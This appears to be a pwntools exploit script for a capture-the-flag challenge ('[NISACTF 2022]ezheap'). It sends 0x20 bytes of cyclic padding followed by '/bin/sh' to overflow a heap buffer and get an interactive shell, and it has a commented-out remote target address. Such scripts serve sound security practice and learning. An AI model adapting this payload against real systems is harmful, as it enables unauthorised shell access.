from pwn import *
context(log_level='debug',arch='x86',os='linux',terminal=['tmux','splitw','-h'])


io=process("./[NISACTF 2022]ezheap")
# io=remote("1.14.71.254",28272)

io.recvuntil("Input:\n")

gdb.attach(io)
pause()

payload=cyclic(0x20)+b"/bin/sh"
io.sendline(payload)

io.interactive()